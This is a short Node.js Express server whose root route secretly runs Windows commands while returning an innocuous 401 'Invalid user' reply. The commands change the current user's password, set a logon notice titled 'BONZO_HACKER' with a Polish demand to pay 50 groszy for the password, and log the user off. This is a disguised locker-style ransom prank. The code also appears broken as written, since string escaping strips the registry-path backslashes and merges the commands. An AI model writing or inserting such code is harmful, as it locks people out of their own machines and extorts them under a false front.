const express = require('express');
const { exec } = require("child_process"); 

const app = express();
 
app.get('/', (req, res) => {
  
  exec("@echo OFF \
  net user %username% admin11 \
  reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_SZ /v legalnoticecaption /d BONZO_HACKER /f  \
  reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_SZ /v legalnoticetext /d MASZ_UTWORZONE_HASLO_NA_MONITOR_ZAPLAC_50GR_A_OTRZYMASZ_SWOJE_HASLO /f \
  shutdown -L", (err, outs, errs) => { 
    console.log(outs); 
  });

  return res.status(401).json({ success: false, message: 'Invalid user to access it.' });
});

app.listen(4001, () => {
  console.log('Server started on: 4001');
});